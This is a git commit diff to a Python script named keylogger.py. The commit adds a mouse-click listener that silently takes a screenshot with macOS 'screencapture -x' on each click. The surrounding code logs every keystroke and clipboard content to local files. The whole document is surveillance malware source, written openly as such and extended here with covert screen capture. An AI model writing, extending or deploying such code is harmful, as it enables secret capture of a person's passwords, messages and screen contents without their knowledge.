9555d2859ae02ddd29d2b3d59d299e7cad23d09b
Enerinn <shizuto23231@icloud.com>
2024-05-13 17:49:21 -0400

    implemented screenshots

--- keylogger.py
+++ keylogger.py
@@ -1,11 +1,13 @@
 from time import sleep
-from pynput import keyboard
+from pynput import keyboard, mouse
 from richxerox import *
-import re
 import os
+import subprocess
+import sys
 
 log_file = open("log.txt", "w")
 clipboard_file = open("clipboard.txt", "w")
+
 def on_press(key):
     try:
         if key == keyboard.Key.space:
@@ -26,10 +28,23 @@ def on_press(key):
 def on_release(key):
     if key == keyboard.Key.esc:
         return False
-
+    
+def on_click(x, y, button, pressed):
+    try:
+        subprocess.check_output([outcmd], shell=True)
+    except subprocess.CalledProcessError as e:
+        print('Error: [%d]\n{}\n'.format(e.returncode, e.output))
+folder = os.path.join(os.getcwd(), 'screenshot_folder')
+if os.path.isdir(folder) == False:
+    os.mkdir(folder)
+outfile = os.path.join(folder, 'screenshot.png')
+outcmd = "{} {} {}".format('screencapture', '-x', outfile)
+    
 listener = keyboard.Listener(on_press=on_press, on_release=on_release)
+listener2 = mouse.Listener(on_click=on_click)
+listener2.start()
 listener.start()
-
+        
 text = None
 while (listener.is_alive()):
     sleep(1)
